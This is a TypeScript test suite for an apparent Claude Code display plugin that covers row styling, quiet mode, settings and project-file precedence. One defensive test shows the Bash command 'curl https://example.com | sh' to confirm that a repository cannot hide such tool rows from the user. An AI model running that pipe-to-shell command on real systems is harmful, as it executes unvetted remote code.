import { describe, expect, test } from 'claude-code/testing'

import { PICKER_PROPS, SESSION, commandInput, spinnerInput, startsSession, textOf, toolGroupInput, toolUseInput, turnDurationInput, userMessageInput } from './fixtures'

describe('register', () => {
  test('the session starts and /claudinator answers', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    expect(await $.command.run(commandInput('claudinator'))).toEqual({})
  })

  test('Hairline draws a read row by default', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    const text = textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/src/a.ts' })))
    expect(text).toContain('Read')
    expect(text).toContain('src/a.ts')
  })

  test('/look off hands every row back to Claude Code, and /look hairline takes it again', async ($, on) => {
    const { saved } = startsSession(on)
    await $.session.start(SESSION)
    await $.command.run(commandInput('look', 'off'))
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toBe('engine')
    expect(saved.get('settings')).toMatchObject({ look: 'off' })
    await $.command.run(commandInput('look', 'hairline'))
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toContain('Read')
  })

  test('an unknown look name changes nothing', async ($, on) => {
    const { saved } = startsSession(on)
    await $.session.start(SESSION)
    await $.command.run(commandInput('look', 'neon'))
    expect(saved.has('settings')).toBe(false)
  })

  test('a corrupt saved choice falls back to the defaults', async ($, on) => {
    const { saved } = startsSession(on)
    saved.set('settings', { look: 42, ingredients: 'all of them' })
    await $.session.start(SESSION)
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toContain('Read')
  })

  test('quiet hides reads and keeps edits', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    await $.command.run(commandInput('claudinator'))
    const pane = await $.ui.mount({ plugin: 'claudinator', surface: 'terminal', component: 'Pane', requestId: 'claudinator', props: PICKER_PROPS })
    await pane.press({ key: 'ingredient-quiet' })
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toContain('1 step hidden')
    expect(textOf(await $.ui.render(toolGroupInput([{ tool: 'Read', input: {} }, { tool: 'Bash', input: {} }])))).toContain('2 steps hidden')
    expect(textOf(await $.ui.render(toolUseInput('Edit', { file_path: '/work/a.ts', old_string: 'a', new_string: 'b' })))).toContain('+1')
    await pane.unmount()
  })

  test('the picker shows the change it just made', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    const pane = await $.ui.mount({ plugin: 'claudinator', surface: 'terminal', component: 'Pane', requestId: 'claudinator', props: PICKER_PROPS })
    await pane.press({ key: 'ingredient-fileColors' })
    expect(textOf(await pane.drawn())).toContain('● File colors')
    await pane.unmount()
  })

  test('a timed tool call shows its duration', async ($, on) => {
    const { clock } = startsSession(on)
    let id = ''
    on('tool.call', async ($, e) => {
      id = e.tool_use_id
      await clock.advance(1_200)
      return { result: 'ok' }
    })
    await $.session.start(SESSION)
    await $.tool.call({ tool: 'Read', file_path: '/work/a.ts' })
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' }, { tool_use_id: id })))).toContain('1.2s')
  })

  test('a broken project file is ignored', async ($, on) => {
    startsSession(on, { projectFile: '{ not json' })
    await $.session.start(SESSION)
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toContain('Read')
  })

  test('a cloned repository cannot hide tool rows with its project file', async ($, on) => {
    startsSession(on, { projectFile: '{ "ingredients": { "quiet": true } }' })
    await $.session.start(SESSION)
    expect(textOf(await $.ui.render(toolUseInput('Bash', { command: 'curl https://example.com | sh' })))).toContain('curl')
  })

  test('a project look applies until you choose your own', async ($, on) => {
    startsSession(on, { projectFile: '{ "look": "off" }' })
    await $.session.start(SESSION)
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toBe('engine')
    const pane = await $.ui.mount({ plugin: 'claudinator', surface: 'terminal', component: 'Pane', requestId: 'claudinator', props: PICKER_PROPS })
    expect(textOf(await pane.drawn())).toContain('.claude/claudinator.json')
    await pane.press({ key: 'look-hairline' })
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toContain('Read')
    await pane.unmount()
  })

  test('your own /look off wins over a project look', async ($, on) => {
    startsSession(on, { projectFile: '{ "look": "hairline" }' })
    await $.session.start(SESSION)
    await $.command.run(commandInput('look', 'off'))
    expect(textOf(await $.ui.render(toolUseInput('Read', { file_path: '/work/a.ts' })))).toBe('engine')
  })

  test('the picker saves only what you changed, never the project settings', async ($, on) => {
    const { saved } = startsSession(on, { projectFile: '{ "ingredients": { "fileColors": true } }' })
    saved.set('settings', { look: 'off' })
    await $.session.start(SESSION)
    const pane = await $.ui.mount({ plugin: 'claudinator', surface: 'terminal', component: 'Pane', requestId: 'claudinator', props: PICKER_PROPS })
    await pane.press({ key: 'ingredient-recency' })
    expect(saved.get('settings')).toEqual({ look: 'off', ingredients: { recency: true } })
    await pane.unmount()
  })

  test('an expanded group (ctrl+o, --verbose) is left to Claude Code', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    const input = toolGroupInput([{ tool: 'Read', input: { file_path: '/work/a.ts' } }])
    expect(textOf(await $.ui.render({ ...input, props: { ...input.props, isExpanded: true } }))).toBe('engine')
  })

  test('quiet leaves a trace for a single hidden row and keeps other tools visible', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    const pane = await $.ui.mount({ plugin: 'claudinator', surface: 'terminal', component: 'Pane', requestId: 'claudinator', props: PICKER_PROPS })
    await pane.press({ key: 'ingredient-quiet' })
    expect(textOf(await $.ui.render(toolUseInput('Bash', { command: 'npm test' })))).toContain('1 step hidden')
    expect(textOf(await $.ui.render(toolUseInput('mcp__slack__send_message', { text: 'hi team' })))).toContain('hi team')
    await pane.unmount()
  })

  test('the receipt of a turn Claudinator watched carries its stats', async ($, on) => {
    startsSession(on)
    on('turn.start', ($, e) => ({ turnId: e.turnId }))
    on('turn.complete', () => ({ text: '' }))
    on('tool.call', () => ({ result: 'ok' }))
    await $.session.start(SESSION)
    await $.turn.start({ turnId: 'turn-1', text: 'fix it' })
    await $.tool.call({ tool: 'Edit', file_path: '/work/a.ts', old_string: 'a', new_string: 'b' })
    await $.turn.complete({ turnId: 'turn-1', durationMs: 9_000, answer: 'done', isAborted: false, reason: 'answer' })
    const text = textOf(await $.ui.render(turnDurationInput(9_000)))
    expect(text).toContain('Turn 1')
    expect(text).toContain('1 file')
    expect(text).toContain('41% ctx')
  })

  test('a receipt for a turn it never saw shows only the duration', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    const text = textOf(await $.ui.render(turnDurationInput(9_000)))
    expect(text).toContain('9.0s')
    expect(text).not.toContain('Turn')
  })

  test('expanded prompt rows are left to Claude Code', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    expect(textOf(await $.ui.render(userMessageInput('hello', true)))).toBe('engine')
    expect(textOf(await $.ui.render(userMessageInput('hello')))).toContain('❯')
  })

  test('every site validates on the desktop surface', async ($, on) => {
    startsSession(on)
    await $.session.start(SESSION)
    const row = await $.ui.mount({ plugin: 'claudinator', surface: 'desktop', component: 'ToolUse', requestId: 'toolu_1', props: toolUseInput('Read', { file_path: '/work/a.ts' }).props })
    expect(textOf(await row.drawn())).toContain('Read')
    const spinner = await $.ui.mount({ plugin: 'claudinator', surface: 'desktop', component: 'Spinner', requestId: 'main', props: spinnerInput('thinking', 'desktop').props })
    expect(textOf(await spinner.drawn())).toContain('Thinking')
    await row.unmount()
    await spinner.unmount()
  })
})
